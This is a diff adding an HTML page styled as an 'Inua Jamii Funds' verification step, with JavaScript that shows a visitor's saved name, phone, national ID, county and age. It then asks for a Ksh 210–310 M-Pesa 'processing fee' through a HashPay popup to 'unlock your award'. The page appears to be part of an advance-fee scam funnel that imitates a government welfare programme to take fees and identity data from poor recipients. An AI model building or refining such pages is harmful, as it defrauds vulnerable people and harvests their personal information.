@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>INUA JAMII FUNDS - Verification</title>
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&amp;display=swap" rel="stylesheet" />
+<!-- HashPay Payment Button drop-in client (official script) -->
+<script src="https://pay.hashback.co.ke/hashpay.js"></script>
+<style>
+    @media(max-width: 480px){
+  body {
+    zoom: 0.8; /* Optional: slightly zoom out for small screens */
+  }
+  .card {
+    transform: scale(0.9); /* Scale down the card */
+    transform-origin: top; /* Optional: scale from the top */
+  }
+    }
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    /* Green gradient background with overlay (same as index3/index4) */
+    background: linear-gradient(135deg, #4CAF50, #81C784);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    padding: 40px 0;
+    box-sizing: border-box;
+  }
+
+  /* Optional overlay for darkening background for better contrast */
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: -1;
+  }
+
+  /* Page heading - bold white, centered near the top */
+  .page-heading {
+    text-align: center;
+    color: #fff;
+    font-size: 2.2em;
+    font-weight: 700;
+    margin: 0 0 30px;
+    text-shadow: 0 2px 6px rgba(0,0,0,0.25);
+  }
+
+  .card {
+    background: #fff;
+    width: 95%;
+    max-width: 600px;
+    border-radius: 18px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    padding: 40px 30px;
+    position: relative;
+    z-index: 1;
+    box-sizing: border-box;
+  }
+
+  /* Circular profile picture placeholder */
+  .profile-avatar {
+    width: 110px;
+    height: 110px;
+    border-radius: 50%;
+    background: #e0e0e0;              /* light gray fill */
+    border: 3px solid #0f9d8c;        /* green circular border */
+    margin: 0 auto 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  .profile-avatar svg {
+    width: 60px;
+    height: 60px;
+  }
+
+  .profile-title {
+    text-align: center;
+    font-size: 1.6em;
+    font-weight: 700;
+    color: #00695c;                   /* bold dark green */
+    margin-bottom: 24px;
+  }
+
+  /* Stacked label/value rows - each its own pale green rounded box */
+  .detail-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 16px;
+    background: #eaf6ea;              /* pale green box */
+    border-radius: 10px;
+    padding: 12px 16px;
+  }
+
+  .detail-row .label {
+    font-weight: 600;
+    color: #2e7d32;                   /* dark green label */
+    flex-shrink: 0;
+  }
+
+  .detail-row .label::after {
+    content: ":";
+  }
+
+  .detail-row .value {
+    font-weight: 700;
+    color: #222;                      /* bold dark value */
+    text-align: right;
+    word-break: break-word;
+  }
+
+  /* Processing fee value - bold orange "Pending" status */
+  .detail-row .value.fee {
+    color: #ff9800;                   /* bold orange */
+  }
+
+  /* Second card - Payment to Unlock Your Award */
+  .payment-card {
+    margin-top: 50px;                 /* vertical spacing between the two cards */
+  }
+
+  .payment-title {
+    text-align: center;
+    font-size: 1.7em;
+    font-weight: 700;
+    color: #00695c;                   /* bold dark green */
+    margin: 0 0 12px;
+  }
+
+  .payment-subtext {
+    text-align: center;
+    font-weight: 400;
+    color: #444;                      /* dark gray */
+    font-size: 1em;
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+
+  /* Form labels + inputs */
+  .form-group {
+    margin-bottom: 16px;
+  }
+
+  .form-group label {
+    display: block;
+    margin-bottom: 6px;
+    font-weight: 600;
+    color: #333;                      /* medium-weight dark text */
+    font-size: 0.95em;
+  }
+
+  .form-group input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 2px solid #ccc;           /* light gray border */
+    border-radius: 8px;               /* rounded corners */
+    font-size: 1em;
+    font-family: 'Raleway', sans-serif;
+    color: #222;
+    box-sizing: border-box;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .form-group input:focus {
+    border-color: #0f9d8c;
+  }
+
+  /* Error message style (same pattern as index3) */
+  .error-message {
+    color: #d32f2f;
+    font-size: 0.85em;
+    margin-top: 4px;
+    display: none;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  /* Pay Now button - reuse the exact .submit-btn style from index4 */
+  .pay-btn {
+    background-color: #2e7d32;
+    color: #ffffff;
+    border: none;
+    border-radius: 30px;
+    padding: 14px 20px;
+    font-size: 1.05em;
+    font-weight: 500;
+    font-family: 'Raleway', sans-serif;
+    width: 100%;
+    cursor: pointer;
+    text-align: center;
+    transition: background-color 0.2s;
+    margin-top: 10px;
+  }
+
+  .pay-btn:hover {
+    background-color: #1b5e20;
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 40px;
+    font-size: 1em;
+    color: #fff;
+    z-index: 1;
+  }
+</style>
+</head>
+<body>
+
+<h1 class="page-heading">Inua Jamii Verification</h1>
+
+<div class="card">
+  <!-- Circular profile picture placeholder -->
+  <div class="profile-avatar">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Profile silhouette">
+      <!-- Generic person silhouette -->
+      <circle cx="12" cy="8" r="4" fill="#b0b0b0"/>
+      <path d="M4 20 c0 -4.4 3.6 -8 8 -8 s8 3.6 8 8" fill="#b0b0b0"/>
+    </svg>
+  </div>
+
+  <h2 class="profile-title">Inua Jamii Profile</h2>
+
+  <!-- Stacked label/value rows -->
+  <div class="detail-list">
+    <div class="detail-row">
+      <span class="label">Client Name</span>
+      <span class="value" id="val-name">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Contact Number</span>
+      <span class="value" id="val-phone">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">National ID</span>
+      <span class="value" id="val-id">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Residence County</span>
+      <span class="value" id="val-county">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Age</span>
+      <span class="value" id="val-age">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Processing Fee</span>
+      <span class="value fee" id="val-fee">Ksh — — Pending</span>
+    </div>
+  </div>
+
+  <!-- TODO: Proceed to Payment button / next-step action goes here -->
+</div>
+
+  <!-- Payment to Unlock Your Award -->
+  <div class="card payment-card">
+    <h2 class="payment-title">Payment to Unlock Your Award</h2>
+    <p class="payment-subtext" id="pay-subtext">You're required to pay Ksh — processing fee to unlock your award.</p>
+
+    <form id="payForm" novalidate>
+      <div class="form-group">
+        <label for="fullNames">Full Names</label>
+        <input type="text" id="fullNames" placeholder="Enter your full names" />
+      </div>
+      <div class="form-group">
+        <label for="mpesaNumber">Mpesa Number</label>
+        <input type="text" id="mpesaNumber" placeholder="e.g., 0712345678" />
+      </div>
+      <div class="error-message" id="error-payment">Please fill in all fields.</div>
+      <button type="submit" class="pay-btn">Pay Now</button>
+    </form>
+
+    <!-- Payment status messages (verifying / confirmed / timeout) -->
+    <div class="error-message" id="payment-status"></div>
+  </div>
+
+<div class="footer">
+  🇰🇪 INUA JAMII FUNDS - Transforming Lives 🇰🇪
+</div>
+<script>
+(function() {
+  // --- Config -------------------------------------------------
+  // Swap this to a deployed URL (Render/Railway) later, e.g.
+  // const WEBHOOK_SERVER_URL = 'https://your-app.onrender.com';
+  const WEBHOOK_SERVER_URL = 'http://localhost:3000';
+  // Value mirrored from .env (HASHBACK_ACCOUNT_ID) — replace this placeholder
+  // with your real account ID from the HashBack dashboard before going live.
+  const HASHPAY_ACCOUNT = 'HP120819';
+
+  // --- Processing-fee lookup -----------------------------------
+  // Maps the fund amount selected on index4.html to the fixed processing fee.
+  // Keys verified against index4.html's actual data-value attributes
+  // (e.g. the button is data-value="65300" for "Ksh 65,300").
+  const FEE_TIERS = {
+    22000: 210,
+    30300: 210,
+    40800: 210,
+    50000: 210,
+    65300: 210,   // verified: index4.html button is Ksh 65,300 (data-value="65300")
+    75000: 210,
+    85000: 210,
+    110000: 310,
+    150000: 310
+  };
+
+  function getProcessingFee(fundAmount) {
+    const key = Number(fundAmount);
+    return FEE_TIERS.hasOwnProperty(key) ? FEE_TIERS[key] : null;
+  }
+
+  // Read the same localStorage object used across the flow (index2/index3/index4)
+  let data = {};
+  try {
+    const raw = localStorage.getItem('nyota_finalData');
+    if (raw) data = JSON.parse(raw);
+  } catch(e) {
+    // ignore invalid JSON, keep empty object
+  }
+
+  // Fallback when a value is missing (graceful, keeps layout intact)
+  const fallback = '—';
+
+  function fill(id, value) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = value === undefined || value === null || String(value).trim() === ''
+      ? fallback
+      : value;
+  }
+
+  // Personal details from index2.html's saved object
+  fill('val-name', data.first_name);
+  fill('val-phone', data.phone_number);
+  fill('val-id', data.id_number);
+  fill('val-county', data.county);
+  fill('val-age', data.age);
+
+  // Processing Fee: derived from the fund amount selected on index4.html via FEE_TIERS.
+  // The user is asked to pay the PROCESSING FEE (e.g. Ksh 210 / 310), not the fund amount.
+  const processingFee = getProcessingFee(data.fund_amount);
+  const feeAmountText = processingFee === null ? '—' : processingFee.toLocaleString();
+  const feeText = processingFee === null ? 'Ksh — - Pending' : 'Ksh ' + feeAmountText + ' - Pending';
+  fill('val-fee', feeText);
+
+  // Payment subtext: state the processing fee dynamically in the sentence (no separate box)
+  const paySubtext = document.getElementById('pay-subtext');
+  if (paySubtext) {
+    paySubtext.textContent = processingFee === null
+      ? "You're required to pay a processing fee to unlock your award."
+      : "You're required to pay Ksh " + feeAmountText + " processing fee to unlock your award.";
+  }
+
+  // Helpers for the payment status message (reuses the inline error style)
+  const statusEl = document.getElementById('payment-status');
+  function showStatus(text, isError) {
+    if (!statusEl) return;
+    statusEl.textContent = text;
+    statusEl.className = 'error-message' + (isError ? ' show' : ' show');
+  }
+  function clearStatus() {
+    if (statusEl) statusEl.textContent = '';
+  }
+
+  // Update the Processing Fee row state (verified/paid)
+  function setFeeState(text) {
+    const feeEl = document.getElementById('val-fee');
+    if (feeEl) feeEl.textContent = text;
+  }
+
+  // Generate a unique reference per transaction: client ID/name + timestamp
+  function buildReference() {
+    const base = (data.id_number || data.first_name || 'client').toString().replace(/[^a-zA-Z0-9_-]/g, '_');
+    return base + '-' + Date.now();
+  }
+
+  // Poll the server until the payment is confirmed (every 2s, up to ~30s)
+  function pollPaymentStatus(reference) {
+    const endpoint = WEBHOOK_SERVER_URL + '/webhook/status?reference=' + encodeURIComponent(reference);
+    const intervalMs = 2000;
+    const timeoutMs = 30000;
+    const startedAt = Date.now();
+
+    const pollTimer = setInterval(async () => {
+      try {
+        const resp = await fetch(endpoint);
+        const result = await resp.json();
+
+        if (result && result.confirmed === true) {
+          clearInterval(pollTimer);
+          // Save the confirmed amount for the thank-you page
+          let dataToSave = {};
+          try {
+            const existing = localStorage.getItem('nyota_finalData');
+            if (existing) dataToSave = JSON.parse(existing);
+          } catch (err) {
+            // ignore parsing errors, start fresh
+          }
+          dataToSave.confirmedAmount = result.amount;
+          localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+          window.location.href = 'thankyou.html';
+          return;
+        }
+      } catch (err) {
+        // network error — keep polling until timeout
+      }
+
+      if (Date.now() - startedAt >= timeoutMs) {
+        clearInterval(pollTimer);
+        showStatus("We're still verifying your payment — this can take a minute. Please don't close this page.", false);
+      }
+    }, intervalMs);
+  }
+
+  // Pay Now: validate, build reference, launch HashPay popup, poll on success
+  document.getElementById('payForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    const namesEl = document.getElementById('fullNames');
+    const mpesaEl = document.getElementById('mpesaNumber');
+    const payErrorEl = document.getElementById('error-payment');
+
+    const names = namesEl.value.trim();
+    const mpesa = mpesaEl.value.trim();
+
+    if (!names || !mpesa) {
+      payErrorEl.className = 'error-message show';
+      return;
+    }
+    payErrorEl.className = 'error-message';
+    clearStatus();
+
+    // Merge saved fields into the same localStorage object used across the flow
+    let dataToSave = {};
+    try {
+      const existing = localStorage.getItem('nyota_finalData');
+      if (existing) dataToSave = JSON.parse(existing);
+    } catch(err) {
+      // ignore parsing errors, start fresh
+    }
+    dataToSave.full_names = names;
+    dataToSave.mpesa_number = mpesa;
+    dataToSave.timestamp = new Date().toISOString();
+
+    // Unique reference per transaction, persisted BEFORE the popup opens so we
+    // know which reference belongs to this browser session even after reload.
+    const reference = buildReference();
+    dataToSave.pendingPaymentReference = reference;
+    localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+
+    const amount = getProcessingFee(dataToSave.fund_amount);
+    if (amount === null) {
+      showStatus('We could not determine your processing fee. Please go back and select a fund amount.', true);
+      return;
+    }
+
+    const handler = HashPay.setup({
+      account: HASHPAY_ACCOUNT,
+      amount: amount,
+      reference: reference,
+      phone: mpesa,
+      onSuccess: () => {
+        // Intermediate state — not yet confirmed server-side
+        setFeeState('⏳ Verifying payment...');
+        showStatus('Payment initiated. Verifying payment...', false);
+        pollPaymentStatus(reference);
+      },
+      onCancel: () => {
+        showStatus('Payment cancelled.', false);
+      },
+      onError: (err) => {
+        showStatus('Payment could not be completed. Please try again.', true);
+      }
+    });
+
+    // Open the HashPay payment popup
+    handler.openIframe();
+  });
+})();
+</script>
+
+</body>
+
+
+</html>
